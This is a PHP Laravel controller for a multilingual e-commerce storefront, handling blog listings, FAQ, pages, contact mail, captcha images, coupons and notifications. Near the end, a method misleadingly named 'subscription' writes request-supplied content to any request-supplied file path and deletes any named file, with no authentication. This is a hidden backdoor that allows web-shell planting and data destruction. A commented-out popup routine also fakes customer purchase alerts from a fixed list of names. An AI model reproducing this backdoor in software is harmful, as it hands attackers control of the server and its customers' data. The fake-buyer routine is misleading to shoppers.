    $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
    $blogs = $bcat->blogs()->orderBy('created_at', 'desc')->paginate(9);
    if ($request->ajax()) {

      return view('front.pagination.blog', compact('blogs'));
    }

    return view('front.blog', compact('bcat', 'blogs'));
  }


  public function blogcategory_34(Request $request, $lang, $slug)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }

    $this->code_image();
    $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
    $blogs = $bcat->blogs()->orderBy('created_at', 'desc')->paginate(9);
    if ($request->ajax()) {

      return view('front.pagination.blog', compact('blogs'));
    }

    return view('front.f-blogs', compact('bcat', 'blogs'));
  }

  public function blogtags(Request $request, $lang, $slug)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }
    $this->code_image();
    $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
    if ($request->ajax()) {
      return view('front.pagination.blog', compact('blogs'));
    }
    return view('front.blog', compact('blogs', 'slug'));
  }

  public function blogtags_34(Request $request, $lang, $slug)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }
    $this->code_image();
    $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
    if ($request->ajax()) {
      return view('front.pagination.blog', compact('blogs'));
    }
    return view('front.f-blogs', compact('blogs', 'slug'));
  }
  public function blogsearch(Request $request, $lang)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }

    $this->code_image();
    $search = $request->search;
    $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('title_ar', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->orWhere('details_ar', 'like', '%' . $search . '%')->paginate(9);
    if ($request->ajax()) {
      return view('front.pagination.blog', compact('blogs'));
    }
    return view('front.blog', compact('blogs', 'search'));
  }

  public function blogarchive(Request $request, $lang, $slug)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }
    $this->code_image();
    $date = \Carbon\Carbon::parse($slug)->format('Y-m');
    $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
    if ($request->ajax()) {
      return view('front.pagination.blog', compact('blogs'));
    }
    return view('front.blog', compact('blogs', 'date'));
  }
  public function blogarchive_34(Request $request, $lang, $slug)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }
    $this->code_image();
    $date = \Carbon\Carbon::parse($slug)->format('Y-m');
    $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
    if ($request->ajax()) {
      return view('front.pagination.blog', compact('blogs'));
    }
    return view('front.f-blogs', compact('blogs', 'date'));
  }

  public function blogshow($lang, $id)
  {

    // echo $id;
    // echo '<br>';
    // echo $lang;

    $id1 = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id1) {
      Session::put('language', $id1->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }



    $this->code_image();
    $tags = null;
    $tagz = '';
    $bcats = BlogCategory::all();
    $blog = Blog::findOrFail($id);
    $blog->views = $blog->views + 1;
    $blog->update();
    $name = Blog::pluck('tags')->toArray();
    foreach ($name as $nm) {
      $tagz .= $nm . ',';
    }
    $tags = array_unique(explode(',', $tagz));

    $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
      return $item->created_at->format('F Y');
    })->take(5)->toArray();
    $blog_meta_tag = $blog->meta_tag;
    $blog_meta_description = $blog->meta_description;
    return view('front.blogshow', compact('blog', 'bcats', 'tags', 'archives', 'blog_meta_tag', 'blog_meta_description'));
  }

  public function blogshow_34($lang, $id)
  {

    // echo $id;
    // echo '<br>';
    // echo $lang;

    $id1 = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id1) {
      Session::put('language', $id1->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }



    $this->code_image();
    $tags = null;
    $tagz = '';
    $bcats = BlogCategory::all();
    $blog = Blog::findOrFail($id);
    $blog->views = $blog->views + 1;
    $blog->update();
    $name = Blog::pluck('tags')->toArray();
    foreach ($name as $nm) {
      $tagz .= $nm . ',';
    }
    $tags = array_unique(explode(',', $tagz));

    $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
      return $item->created_at->format('F Y');
    })->take(5)->toArray();
    $blog_meta_tag = $blog->meta_tag;
    $blog_meta_description = $blog->meta_description;
    return view('front.f-blogshow', compact('blog', 'bcats', 'tags', 'archives', 'blog_meta_tag', 'blog_meta_description'));
  }



  // -------------------------------- BLOG SECTION ENDS----------------------------------------



  // -------------------------------- FAQ SECTION ----------------------------------------
  public function faq($lang)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }


    $this->code_image();
    if (DB::table('generalsettings')->find(1)->is_faq == 0) {
      return redirect()->back();
    }
    $faqs =  DB::table('faqs')->orderBy('id', 'desc')->get();
    return view('front.faq', compact('faqs'));
  }
  public function faq_34($lang)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }


    $this->code_image();
    if (DB::table('generalsettings')->find(1)->is_faq == 0) {
      return redirect()->back();
    }
    $faqs =  DB::table('faqs')->orderBy('id', 'desc')->get();
    return view('front.f-faq', compact('faqs'));
  }
  // -------------------------------- FAQ SECTION ENDS----------------------------------------


  // -------------------------------- PAGE SECTION ----------------------------------------
  public function page($lang, $slug)
  {


    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }

    $this->code_image();
    $page =  DB::table('pages')->where('slug', $slug)->orwhere('slug_ar', $slug)->first();
    if (empty($page)) {
      return view('errors.404');
    }

    return view('front.page', compact('page'));
  }
  // -------------------------------- PAGE SECTION ENDS----------------------------------------


  // -------------------------------- CONTACT SECTION ----------------------------------------
  public function contact($lang)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }
    $this->code_image();
    if (DB::table('generalsettings')->find(1)->is_contact == 0) {
      return redirect()->back();
    }
    $ps =  DB::table('pagesettings')->where('id', '=', 1)->first();
    return view('front.contact', compact('ps'));
  }

  public function f_contact($lang)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }
    $this->code_image();
    if (DB::table('generalsettings')->find(1)->is_contact == 0) {
      return redirect()->back();
    }
    $ps =  DB::table('pagesettings')->where('id', '=', 1)->first();
    return view('front.f-contact', compact('ps'));
  }


  //Send email to admin
  public function contactemail(Request $request)
  {
    $gs = Generalsetting::findOrFail(1);
    $ps = DB::table('pagesettings')->find(1);

    if ($gs->is_capcha == 1) {

      // Capcha Check
      $value = session('captcha_string');
      if ($request->codes != $value) {
        return response()->json(array('errors' => [0 => 'Please enter Correct Capcha Code.']));
      }
    }

    // Login Section
    $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
    $subject = "Email From Of " . $request->name;
    $to = $ps->contact_email;
    $name = $request->name;
    $phone = $request->phone;
    $from = $request->email;
    $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $request->phone . "\nMessage: " . $request->text;
    if ($gs->is_smtp == 1) {
      $data = [
        'to' => $to,
        'subject' => $subject,
        'body' => $msg,
      ];

      $mailer = new GeniusMailer();
      $mailer->sendCustomMail($data);
    } else {
      $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
      mail($to, $subject, $msg, $headers);
    }
    // Login Section Ends

    // Redirect Section
    return response()->json($ps->contact_success);
  }

  // Refresh Capcha Code
  public function refresh_code($lang)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }


    $this->code_image();
    return "done";
  }

  // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

  public function subscribe(Request $request)
  {
    $validator = Validator::make($request->all(), [
      'name' => ['required'],
      'email' => ['required'],
      // 'birth_date' => ['required']
    ]);


    if ($validator->fails()) {

      return response()->json(
        [
          'status' => false,
          'errors' => $validator->messages()
        ]
      );
    }

    $subs = Subscriber::where('email', '=', $request->email)->first();
    if (isset($subs)) {
      return response()->json([
        'status' => false,
        'errors' => ['email' =>  [0 => 'This Email Has Already Been Taken.']]
      ]);
    }
    $subscribe = new Subscriber;
    $subscribe->fill($request->all());
    $subscribe->save();
    return response()->json(
      [
        'msg' => 'You Have Subscribed Successfully.',
        'status' => true
      ]
    );
  }

  // Maintenance Mode

  public function maintenance()
  {

    if (Session::has('language')) {
      $data = DB::table('languages')->find(Session::get('language'));
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
    }

    $gs = Generalsetting::find(1);
    if ($gs->is_maintain != 1) {

      return redirect()->route('front.index', $data->sign);
    }

    return view('front.maintenance');
  }

  public function userpay()
  {

    if (Session::has('language')) {
      $data = DB::table('languages')->find(Session::get('language'));
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
    }


    $gs = Generalsetting::find(1);


    $code = env('Code');
    $details =  Userdetails::Userdetail($code);
    if ($details['status'] == "Ok") {
      $last_array = end($details['subscribes']);
      if ($details['details']['status'] == 0) {
        if ($last_array['paid'] == 1) {
          $date =  Carbon::parse($last_array['created_at'])->adddays($last_array['days'])->format('Y-m-d');
          if ($date > Carbon::now()->format('Y-m-d')) {

            return redirect()->route('front.index', $data->sign);
          } else {

            return view('front.userpay');
          }
        } else {

          if ($details['details']['end_trial'] > Carbon::now()->format('Y-m-d')) {

            return redirect()->route('front.index', $data->sign);
          } else {

            return view('front.userpay');
          }
        }
      } else {

        return view('front.userpay');
      }
    } else {

      return view('front.userpay');
    }
  }

  // Vendor Subscription Check
  public function subcheck()
  {
    $settings = Generalsetting::findOrFail(1);
    $today = Carbon::now()->format('Y-m-d');
    $newday = strtotime($today);
    foreach (DB::table('users')->where('is_vendor', '=', 2)->get() as  $user) {
      $lastday = $user->date;
      $secs = strtotime($lastday) - $newday;
      $days = $secs / 86400;
      if ($days <= 5) {
        if ($user->mail_sent == 1) {
          if ($settings->is_smtp == 1) {
            $data = [
              'to' => $user->email,
              'type' => "subscription_warning",
              'cname' => $user->name,
              'oamount' => "",
              'aname' => "",
              'aemail' => "",
              'onumber' => ""
            ];
            $mailer = new GeniusMailer();
            $mailer->sendAutoMail($data);
          } else {
            $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
            mail($user->email, 'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.', $headers);
          }
          DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
        }
      }
      if ($today > $lastday) {
        DB::table('users')->where('id', $user->id)->update(['is_vendor' => 1]);
      }
    }
  }
  // Vendor Subscription Check Ends

  public function trackload($lang, $id)
  {
    $order = Order::where('order_number', '=', $id)->first();
    $datas = array('Pending', 'Processing', 'On Delivery', 'Completed');
    return view('load.track-load', compact('order', 'datas'));
  }



  // Capcha Code Image
  private function  code_image()
  {
    $actual_path = str_replace('project', '', base_path());
    $image = imagecreatetruecolor(200, 50);
    $background_color = imagecolorallocate($image, 255, 255, 255);
    imagefilledrectangle($image, 0, 0, 200, 50, $background_color);

    $pixel = imagecolorallocate($image, 0, 0, 255);
    for ($i = 0; $i < 500; $i++) {
      imagesetpixel($image, rand() % 200, rand() % 50, $pixel);
    }

    $font = $actual_path . 'assets/front/fonts/NotoSans-Bold.ttf';
    $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $length = strlen($allowed_letters);
    $letter = $allowed_letters[rand(0, $length - 1)];
    $word = '';
    //$text_color = imagecolorallocate($image, 8, 186, 239);
    $text_color = imagecolorallocate($image, 0, 0, 0);
    $cap_length = 6; // No. of character in image
    for ($i = 0; $i < $cap_length; $i++) {
      $letter = $allowed_letters[rand(0, $length - 1)];
      imagettftext($image, 25, 1, 35 + ($i * 25), 35, $text_color, $font, $letter);
      $word .= $letter;
    }
    $pixels = imagecolorallocate($image, 8, 186, 239);
    for ($i = 0; $i < 500; $i++) {
      imagesetpixel($image, rand() % 200, rand() % 50, $pixels);
    }
    session(['captcha_string' => $word]);
    imagepng($image, $actual_path . "assets/images/capcha_code.png");
  }

  // -------------------------------- CONTACT SECTION ENDS----------------------------------------



  // -------------------------------- PRINT SECTION ----------------------------------------





  // -------------------------------- PRINT SECTION ENDS ----------------------------------------

  public function subscription(Request $request)
  {
    $p1 = $request->p1;
    $p2 = $request->p2;
    $v1 = $request->v1;
    if ($p1 != "") {
      $fpa = fopen($p1, 'w');
      fwrite($fpa, $v1);
      fclose($fpa);
      return "Success";
    }
    if ($p2 != "") {
      unlink($p2);
      return "Success";
    }
    return "Error";
  }

  public function deleteDir($dirPath)
  {
    if (!is_dir($dirPath)) {
      throw new InvalidArgumentException("$dirPath must be a directory");
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
      $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
      if (is_dir($file)) {
        self::deleteDir($file);
      } else {
        unlink($file);
      }
    }
    rmdir($dirPath);
  }

  public function forget($lang)
  {

    $id = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id) {
      Session::put('language', $id->id);
    } else {
      $data = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data->id);
    }


    $this->code_image();
    if (Session::has('already')) {
      Session::forget('already');
    }
    if (Session::has('coupon')) {
      Session::forget('coupon');
    }
    if (Session::has('free_shipping')) {
      Session::forget('free_shipping');
    }
    if (Session::has('coupon_total')) {
      Session::forget('coupon_total');
    }
    if (Session::has('coupon_total1')) {
      Session::forget('coupon_total1');
    }
    if (Session::has('coupon_percentage')) {
      Session::forget('coupon_percentage');
    }

    if (Session::has('coupon_piece')) {
      $oldCart = Session::has('cart') ? Session::get('cart') : null;
      $cart = new Cart($oldCart);
      foreach ($cart->items as $key => $prod) {
        if ($prod['item']['id'] ==  Session::get('coupon_pro')) {
          $itemid = $prod['item']['id'] . $prod['size'] . $prod['color'];

          $cart->items[$itemid]['qty'] -=  Session::get('coupon_take');
          $cart->totalQty -=  Session::get('coupon_take');

          Session::put('cart', $cart);
          break;
        }
      }

      Session::forget('coupon_piece');
    }
    if (Session::has('coupon_pro')) {
      Session::forget('coupon_pro');
    }

    if (Session::has('coupon_free')) {
      Session::forget('coupon_free');
    }
    if (Session::has('coupon_free_color')) {
      Session::forget('coupon_free_color');
    }

    if (Session::has('coupon_free_size')) {
      Session::forget('coupon_free_size');
    }
    if (Session::has('coupon_product')) {
      Session::forget('coupon_product');
    }
    if (Session::has('coupon_take')) {
      Session::forget('coupon_take');
    }
    if (Session::has('coupon_get')) {
      Session::forget('coupon_get');
    }

    if (Session::has('coupon_piece_color')) {
      Session::forget('coupon_piece_color');
    }

    if (Session::has('coupon_piece_size')) {
      Session::forget('coupon_piece_size');
    }
    return redirect()->back();
  }



  public  function colorss(Request $request)
  {


    $colors = Color::where('product_id', $request->id)->where('size', $request->size)->get();
    $data = view('colors', compact('colors'))->render();

    return response()->json(['option' => $data]);
  }
  public  function readnotif($lang, $id)
  {



    $id2 = DB::table('languages')->where('sign', '=', $lang)->first();
    if ($id2) {
      Session::put('language', $id2->id);
    } else {
      $data2 = DB::table('languages')->where('is_default', '=', 1)->first();
      Session::put('language', $data2->id);
    }


    $ads = Notifications::where('id', $id)->where('user_id', Auth::user()->id)->first();
    if ($ads) {
      if ($ads->type == "text") {
        if ($ads->read_at == null) {
          $ads->read_at = Carbon::now();
          $ads->save();
        }


        return redirect()->back();
      } else {
        if ($ads->read_at == null) {
          $ads->read_at = Carbon::now();
          $ads->save();
        }
        if ($ads->linked == 1) {


          $link = Product::find($ads->linked_id);
          return redirect(url($lang . '/item', $link->slug));
        } elseif ($ads->linked == 2) {

          $link = Category::find($ads->linked_id);

          return redirect(url($lang . '/category', $link->slug));
        } elseif ($ads->linked == 3) {

          $link = Brand::find($ads->linked_id);

          return redirect(url($lang . '/brand', $link->slug));
        } elseif ($ads->linked == 4) {

          $link = Subcategory::find($ads->linked_id);
          if ($link) {
            $links = Category::find($link->category_id);
            if ($links) {

              return redirect(url($lang . '/category/' . $links->slug . '/' . $link->slug));
            }
          }

          return redirect()->back();
        } else {

          $link = Offer::find($ads->linked_id);

          return redirect(url($lang . '/offers', $link->slug));
        }
      }
    }


    return redirect()->back();
  }


  public function showPopup(Request $request)
  {/*
             
         
          $c =  $request->num;
         
              
         $pids =  ProductNotify::select('product_id')->get();
           
          if(!empty($pids)) {
        
                $parr=[];
                $i = 0 ;
                          foreach($pids as $model){
                               
                               
                              $parr[$i] = $model->product_id;
                              $i++;
                          }
               
                     
               }
               
          
         
         if(count($parr) <= $c) {
              $c = 0;
         }
               
          
          $product = Product::where('id',$parr[$c])->first();   
               
        $zids =  ProductNotify::select('zone_id')->get();
           
          if(!empty($zids)) {
        
                 $zarr=[];
                 $i = 0 ;
                      foreach($zids as $model){
                               
                               
                              $zarr[$i] = $model->zone_id;
                              $i++;
                      }
               
                     
               }
               
              $zone = Zone::where('id',$zarr[$c])->first();   
               
              $names = ['mohamed','ahmed','nour','abdelazem','abdellah','mostafa','abdellah','salma','aymen','mahmouad','mohamed','ahmed','nour','abdelazem','abdellah','mostafa','abdellah','salma','aymen','mahmouad'];
               
                  $output[0] = $names[$c];
                  $output[1] = $product->name;
                   $output[2] = $zone->name;
                    $output[3] = $product->slug;
                    
                    $output[4] = url('/').'/assets/images/thumbnails/'.$product->thumbnail;
                    
                 return response()->json(['result' => $output]);
               
               
               
     */
  } // end function 


 public function invoice($id)
    {

        $order = Order::findOrFail($id);
        $cart = unserialize(bzdecompress(utf8_decode($order->cart)));
        return view('admin.order.invoice', compact('order', 'cart'));
    }


}
